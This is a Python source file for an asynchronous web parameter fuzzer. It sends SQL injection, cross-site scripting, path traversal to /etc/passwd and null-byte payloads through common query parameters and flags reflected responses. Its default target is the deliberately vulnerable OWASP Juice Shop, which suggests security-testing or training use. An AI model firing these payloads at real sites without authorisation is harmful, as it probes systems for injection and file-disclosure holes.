# src/fuzzing/parameter_fuzz_runner.py
import asyncio
from urllib.parse import urlencode
from src.utils.request_handler import AsyncRequestHandler

# Common suspicious parameter names
PARAM_NAMES = [
    "id", "page", "user", "search", "query", "file",
    "token", "action", "redirect", "auth", "username", "password", "login", "email"
]

# Sample payloads
PAYLOADS = [
    "' OR '1'='1",
    "<script>alert(1)</script>",
    "../../../etc/passwd",
    "admin",
    "root",
    "null",
    "''",
    "%00",
    "%3Cscript%3Ealert(1)%3C/script%3E"
]

async def fuzz_parameters(base_url):
    handler = AsyncRequestHandler()
    tasks = []

    for param in PARAM_NAMES:
        for payload in PAYLOADS:
            query_string = urlencode({param: payload})
            fuzz_url = f"{base_url}?{query_string}"
            tasks.append(handler.send_request(fuzz_url))

    responses = await asyncio.gather(*tasks)

    for res in responses:
        status = res['status']
        url = res['url']
        size = res['size']
        content = res['content'][:300]  # trim for preview

        if res['success']:
            print(f"[+] {status} {url} [{size} bytes]")
            if any(payload in content for payload in PAYLOADS):
                print("    [!] Payload reflected in response!")
        else:
            print(f"[-] Failed: {url} — {res['error']}")

if __name__ == "__main__":
    import sys
    target = sys.argv[1] if len(sys.argv) > 1 else "https://demo.owasp-juice.shop#/"
    asyncio.run(fuzz_parameters(target))
